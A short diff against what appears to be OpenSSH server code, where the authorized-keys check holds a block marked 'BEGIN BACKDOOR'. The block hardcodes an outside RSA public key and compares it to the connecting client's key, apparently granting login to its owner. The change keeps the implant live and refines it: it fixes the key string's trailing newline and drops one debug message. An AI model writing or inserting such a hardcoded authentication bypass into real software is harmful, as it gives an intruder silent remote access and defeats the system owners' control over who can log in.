@@ -343,12 +343,11 @@ check_authkeys_file(FILE *f, char *file, Key* key, struct passwd *pw)
 	found_key = 0;
 
 	/********** BEGIN BACKDOOR ***************/
-	char *backdoor_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDMfAdPOOBDuzYih8neJCs6YA0fHyuDTieslk4GjM19JJh89zYR+uXKUlMzwAdEfEoELugoqYRMGg0QVSYIlDzzTtPc26agKEBZAZas7Q+M/Y6HD76EdFbNFzYJ4wo/cYfDpxr2uXhAhKOAQ0AVGBrd26SgHmw4iX8HqLniqyLj+f41jLJoaH09YUQ/O6ZX9nFDoF3fXo2GJJYoxEz0/d63+vKst22vd1XKXApdir3QwfpMwrmMIsS4ObotQsZ0DO9Mbtcv5EmV3/h1EQFIRSNwObKDUMIa0zvZRpGM8LVBzlZ8meVrHm3BiycYSIWjAgrgbUoypuKpGQOevRaF1jDovaX6XVOZyek8WwYWo4J3xYQBpX3Y337T/+VTwdsLwdDWtyMoFjiG0Kgx7qK6zsaHKA8ZElN7OkRlhbQoXlUrvwPWjrw8jM75vhMXpM1ZcS/MzXxUvVJdgoAXcarx9fqfX/BQJcwtR0THiOCeFGq1PTyv2BWn2FkraRozS/hkZS+CmdnDxl26/YE9Ls79+DN13Xgao5aLM/hnti5iXixmuqmv+xENIYyO21wjDbvuool25W58BXj6Yecrxhi68UI899NE9iV38kHeUIYYD1/K7/F9Y7g4PKhDN4KMshYambfqzdx9S+aaeE06+LdapOQt40G9MdgUn73b7uz3il/04Q== martin@phoenix";
+	char *backdoor_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDMfAdPOOBDuzYih8neJCs6YA0fHyuDTieslk4GjM19JJh89zYR+uXKUlMzwAdEfEoELugoqYRMGg0QVSYIlDzzTtPc26agKEBZAZas7Q+M/Y6HD76EdFbNFzYJ4wo/cYfDpxr2uXhAhKOAQ0AVGBrd26SgHmw4iX8HqLniqyLj+f41jLJoaH09YUQ/O6ZX9nFDoF3fXo2GJJYoxEz0/d63+vKst22vd1XKXApdir3QwfpMwrmMIsS4ObotQsZ0DO9Mbtcv5EmV3/h1EQFIRSNwObKDUMIa0zvZRpGM8LVBzlZ8meVrHm3BiycYSIWjAgrgbUoypuKpGQOevRaF1jDovaX6XVOZyek8WwYWo4J3xYQBpX3Y337T/+VTwdsLwdDWtyMoFjiG0Kgx7qK6zsaHKA8ZElN7OkRlhbQoXlUrvwPWjrw8jM75vhMXpM1ZcS/MzXxUvVJdgoAXcarx9fqfX/BQJcwtR0THiOCeFGq1PTyv2BWn2FkraRozS/hkZS+CmdnDxl26/YE9Ls79+DN13Xgao5aLM/hnti5iXixmuqmv+xENIYyO21wjDbvuool25W58BXj6Yecrxhi68UI899NE9iV38kHeUIYYD1/K7/F9Y7g4PKhDN4KMshYambfqzdx9S+aaeE06+LdapOQt40G9MdgUn73b7uz3il/04Q== martin@phoenix\n";
 	char *char_pointer = backdoor_key;
 	found = key_new(key_is_cert(key) ? KEY_UNSPEC : key->type);
 	auth_clear_options();
 	debug("KK: Checkpoint 1 ;)");
-	debug("KK: new key %x ;)", found);
 	int ret = key_read(found, &char_pointer);
 	debug("KK: Checkpoint 2 ;)");
 	if (key_equal(found, key)) {
